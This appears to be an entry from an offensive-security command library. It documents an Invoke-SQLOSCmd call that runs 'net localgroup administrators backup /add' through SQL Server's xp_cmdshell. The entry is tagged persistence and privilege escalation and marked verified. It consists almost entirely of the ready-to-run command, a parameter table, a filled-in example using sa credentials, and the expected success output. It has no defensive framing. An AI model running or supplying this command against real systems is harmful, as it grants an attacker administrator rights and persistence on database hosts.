---
type: command
executor: powershell
data: >-
  Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance
  "$_INSTANCE" -Command "net localgroup administrators backup /add" -Verbose
output: null
platforms:
  - Windows
  - SQL Server
tags:
  - persistence
  - privilege-escalation
  - command-execution
verified: true
validated: true
---

# invoke-sqloscmd-add-user-backup-to-local-administrators

## Command

```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "net localgroup administrators backup /add" -Verbose
```

## Description

This command adds the existing local user 'backup' to the Administrators group on the SQL Server host via xp_cmdshell, granting elevated privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Username | SQL Server login username | Yes |
| -Password | SQL Server login password | Yes |
| -Instance | SQL Server instance name | Yes |
| -Command | OS command (net localgroup ... /add) | Yes |
| -Verbose | Enable detailed output | No |

## Examples

### Basic Usage

```powershell
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "DBSERVER\SQLEXPRESS" -Command "net localgroup administrators backup /add" -Verbose
```

## Expected Output

```
The command completed successfully.
```

If failed: "User not found" or access denied.

## Related

- [[procedures/mssql-command-execution-via-xp-cmdshell-with-invoke-sqloscmd]]
- [[commands/invoke-sqloscmd-create-local-user-backup]]
